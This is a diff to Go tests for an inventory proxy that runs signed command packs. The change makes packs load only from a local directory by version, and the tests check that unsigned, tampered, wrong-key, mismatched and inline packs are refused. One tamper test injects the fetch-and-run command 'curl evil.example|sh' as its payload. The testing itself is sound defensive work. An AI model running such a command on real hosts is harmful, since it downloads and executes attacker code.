@@ -6,6 +6,7 @@ import (
 	"crypto/ed25519"
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"log/slog"
 	"os"
 	"path/filepath"
@@ -40,6 +41,19 @@ func packPubKeyB64(t *testing.T) (string, ed25519.PrivateKey) {
 	return base64.StdEncoding.EncodeToString(pub), priv
 }
 
+// writePackDir writes a signed pack where the proxy expects to find it. Tests
+// go through the same path production does: packs are read from disk, never
+// supplied by the request.
+func writePackDir(t *testing.T, body string, priv ed25519.PrivateKey, version int) string {
+	t.Helper()
+	dir := t.TempDir()
+	name := fmt.Sprintf("linux-inventory-v%d.yaml", version)
+	if err := os.WriteFile(filepath.Join(dir, name), []byte(signPack(t, body, priv)), 0o600); err != nil {
+		t.Fatalf("writing pack: %v", err)
+	}
+	return dir
+}
+
 func TestConfigure_RequiresCredentials(t *testing.T) {
 	p := New(slog.New(slog.DiscardHandler))
 
@@ -54,15 +68,16 @@ func TestConfigure_RequiresCredentials(t *testing.T) {
 // A pack we cannot verify must not run. Without a key configured there is no
 // trust root, so every pack is untrusted.
 func TestHandleInventory_RefusesWithoutPackKey(t *testing.T) {
-	p, _ := newTestProxy(t, map[string]any{}, map[string]string{
+	_, priv := packPubKeyB64(t)
+	p, _ := newTestProxy(t, map[string]any{"pack_dir": writePackDir(t, validBody, priv, 3)}, map[string]string{
 		"username": "nudgebee-ro", "password": "x",
 	})
 
 	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 		Action: "discovery_inventory",
 		Params: map[string]any{
-			"targets":      []any{"10.0.1.5"},
-			"content_pack": validBody,
+			"targets":              []any{"10.0.1.5"},
+			"content_pack_version": 3,
 		},
 	})
 	if err == nil {
@@ -75,15 +90,21 @@ func TestHandleInventory_RefusesWithoutPackKey(t *testing.T) {
 
 func TestHandleInventory_RefusesTamperedPack(t *testing.T) {
 	pubB64, priv := packPubKeyB64(t)
-	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
+
+	// A pack edited on disk after signing must not run.
+	dir := t.TempDir()
+	tampered := strings.Replace(signPack(t, validBody, priv), "rpm -qa", "curl evil.example|sh", 1)
+	if err := os.WriteFile(filepath.Join(dir, "linux-inventory-v3.yaml"), []byte(tampered), 0o600); err != nil {
+		t.Fatalf("writing pack: %v", err)
+	}
+
+	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64, "pack_dir": dir}, map[string]string{
 		"username": "nudgebee-ro", "password": "x",
 	})
 
-	tampered := strings.Replace(signPack(t, validBody, priv), "rpm -qa", "curl evil.example|sh", 1)
-
 	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 		Action: "discovery_inventory",
-		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack": tampered},
+		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 3},
 	})
 	if err == nil {
 		t.Fatal("tampered pack was executed")
@@ -96,14 +117,15 @@ func TestHandleInventory_RejectsOutOfScopeTargets(t *testing.T) {
 	pubB64, priv := packPubKeyB64(t)
 	p, _ := newTestProxy(t, map[string]any{
 		"pack_public_key": pubB64,
+		"pack_dir":        writePackDir(t, validBody, priv, 3),
 		"allowed_cidrs":   []any{"10.0.1.0/24"},
 	}, map[string]string{"username": "nudgebee-ro", "password": "x"})
 
 	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 		Action: "discovery_inventory",
 		Params: map[string]any{
-			"targets":      []any{"192.168.99.5"},
-			"content_pack": signPack(t, validBody, priv),
+			"targets":              []any{"192.168.99.5"},
+			"content_pack_version": 3,
 		},
 	})
 	if err != nil {
@@ -131,14 +153,15 @@ func TestHandleInventory_ReportsPackVersion(t *testing.T) {
 	pubB64, priv := packPubKeyB64(t)
 	p, _ := newTestProxy(t, map[string]any{
 		"pack_public_key": pubB64,
+		"pack_dir":        writePackDir(t, validBody, priv, 3),
 		"allowed_cidrs":   []any{"10.0.1.0/24"},
 	}, map[string]string{"username": "nudgebee-ro", "password": "x"})
 
 	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 		Action: "discovery_inventory",
 		Params: map[string]any{
-			"targets":      []any{"192.168.99.5"}, // out of scope: no dialing needed
-			"content_pack": signPack(t, validBody, priv),
+			"targets":              []any{"192.168.99.5"}, // out of scope: no dialing needed
+			"content_pack_version": 3,
 		},
 	})
 	if err != nil {
@@ -162,6 +185,7 @@ func TestHandleInventory_DoesNotLeakCredentials(t *testing.T) {
 	pubB64, priv := packPubKeyB64(t)
 	p, logBuf := newTestProxy(t, map[string]any{
 		"pack_public_key":      pubB64,
+		"pack_dir":             writePackDir(t, validBody, priv, 3),
 		"allowed_cidrs":        []any{"10.0.1.0/24"},
 		"dial_timeout_seconds": 1,
 		"host_timeout_seconds": 2,
@@ -170,8 +194,8 @@ func TestHandleInventory_DoesNotLeakCredentials(t *testing.T) {
 	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 		Action: "discovery_inventory",
 		Params: map[string]any{
-			"targets":      []any{"10.0.1.5", "192.168.99.5"},
-			"content_pack": signPack(t, validBody, priv),
+			"targets":              []any{"10.0.1.5", "192.168.99.5"},
+			"content_pack_version": 3,
 		},
 	})
 	if err != nil {
@@ -191,19 +215,57 @@ func TestHandleInventory_DoesNotLeakCredentials(t *testing.T) {
 // that invariant against future refactors — the paths into execution are
 // handleInventory -> resolvePack -> verifyPack, and every one of them must
 // refuse rather than degrade.
+// The security of this module rests on one invariant: no command reaches a
+// host unless it came from a pack read off local disk whose signature
+// verified. This pins that invariant against future refactors — every way a
+// pack can fail to verify must refuse rather than degrade, and a request must
+// never be able to supply pack content itself.
 func TestHandleInventory_NoUnverifiedCommandPath(t *testing.T) {
-	_, priv := packPubKeyB64(t)
+	pubB64, priv := packPubKeyB64(t)
 	otherPubB64, _ := packPubKeyB64(t)
 
+	unsignedDir := t.TempDir()
+	if err := os.WriteFile(filepath.Join(unsignedDir, "linux-inventory-v3.yaml"), []byte(validBody), 0o600); err != nil {
+		t.Fatalf("writing pack: %v", err)
+	}
+
 	cases := []struct {
-		name string
-		cfg  map[string]any
-		pack string
+		name   string
+		cfg    map[string]any
+		params map[string]any
 	}{
-		{"no key configured", map[string]any{}, signPack(t, validBody, priv)},
-		{"unsigned pack", map[string]any{"pack_public_key": otherPubB64}, validBody},
-		{"signed by another key", map[string]any{"pack_public_key": otherPubB64}, signPack(t, validBody, priv)},
-		{"version with no cache or pack_dir", map[string]any{"pack_public_key": otherPubB64}, ""},
+		{
+			"no pack key configured",
+			map[string]any{"pack_dir": writePackDir(t, validBody, priv, 3)},
+			map[string]any{"content_pack_version": 3},
+		},
+		{
+			"unsigned pack on disk",
+			map[string]any{"pack_public_key": pubB64, "pack_dir": unsignedDir},
+			map[string]any{"content_pack_version": 3},
+		},
+		{
+			"pack signed by another key",
+			map[string]any{"pack_public_key": otherPubB64, "pack_dir": writePackDir(t, validBody, priv, 3)},
+			map[string]any{"content_pack_version": 3},
+		},
+		{
+			"version not present in pack_dir",
+			map[string]any{"pack_public_key": pubB64, "pack_dir": writePackDir(t, validBody, priv, 3)},
+			map[string]any{"content_pack_version": 99},
+		},
+		{
+			"no pack_dir configured",
+			map[string]any{"pack_public_key": pubB64},
+			map[string]any{"content_pack_version": 3},
+		},
+		{
+			// Requests select a pack; they cannot carry one. An inline body
+			// must not be honoured even when validly signed.
+			"inline pack body is not accepted",
+			map[string]any{"pack_public_key": pubB64},
+			map[string]any{"content_pack": signPack(t, validBody, priv)},
+		},
 	}
 
 	for _, tc := range cases {
@@ -213,36 +275,64 @@ func TestHandleInventory_NoUnverifiedCommandPath(t *testing.T) {
 			})
 
 			params := map[string]any{"targets": []any{"10.0.1.5"}}
-			if tc.pack != "" {
-				params["content_pack"] = tc.pack
-			} else {
-				params["content_pack_version"] = 3
+			for k, v := range tc.params {
+				params[k] = v
 			}
 
 			if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
 				Action: "discovery_inventory",
 				Params: params,
 			}); err == nil {
-				t.Fatalf("commands would have executed without a verified pack: %s", tc.name)
+				t.Fatalf("commands would have executed without a verified on-disk pack: %s", tc.name)
 			}
 		})
 	}
 }
 
-func TestHandleInventory_ValidatesParams(t *testing.T) {
-	pubB64, _ := packPubKeyB64(t)
-	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
+// A version that mismatches what the pack declares must be refused: it would
+// otherwise mislabel results and make server-side correlation wrong.
+func TestHandleInventory_RefusesVersionMismatch(t *testing.T) {
+	pubB64, priv := packPubKeyB64(t)
+
+	dir := t.TempDir()
+	// File says v7, pack body declares v3.
+	if err := os.WriteFile(filepath.Join(dir, "linux-inventory-v7.yaml"), []byte(signPack(t, validBody, priv)), 0o600); err != nil {
+		t.Fatalf("writing pack: %v", err)
+	}
+
+	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64, "pack_dir": dir}, map[string]string{
 		"username": "nudgebee-ro", "password": "x",
 	})
+
+	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
+		Action: "discovery_inventory",
+		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 7},
+	})
+	if err == nil {
+		t.Fatal("accepted a pack whose declared version differs from the one requested")
+	}
+	if !strings.Contains(err.Error(), "mismatch") {
+		t.Errorf("error = %q, want it to name the version mismatch", err)
+	}
+}
+
+func TestHandleInventory_ValidatesParams(t *testing.T) {
+	pubB64, priv := packPubKeyB64(t)
+	p, _ := newTestProxy(t, map[string]any{
+		"pack_public_key": pubB64,
+		"pack_dir":        writePackDir(t, validBody, priv, 3),
+	}, map[string]string{"username": "nudgebee-ro", "password": "x"})
 
 	cases := []struct {
 		name   string
 		params map[string]any
 	}{
-		{"no targets", map[string]any{"content_pack": validBody}},
-		{"empty targets", map[string]any{"targets": []any{}, "content_pack": validBody}},
-		{"non-string targets", map[string]any{"targets": []any{42}, "content_pack": validBody}},
-		{"no pack", map[string]any{"targets": []any{"10.0.1.5"}}},
+		{"no targets", map[string]any{"content_pack_version": 3}},
+		{"empty targets", map[string]any{"targets": []any{}, "content_pack_version": 3}},
+		{"non-string targets", map[string]any{"targets": []any{42}, "content_pack_version": 3}},
+		{"no pack version", map[string]any{"targets": []any{"10.0.1.5"}}},
+		{"zero pack version", map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": 0}},
+		{"negative pack version", map[string]any{"targets": []any{"10.0.1.5"}, "content_pack_version": -1}},
 	}
 
 	for _, tc := range cases {
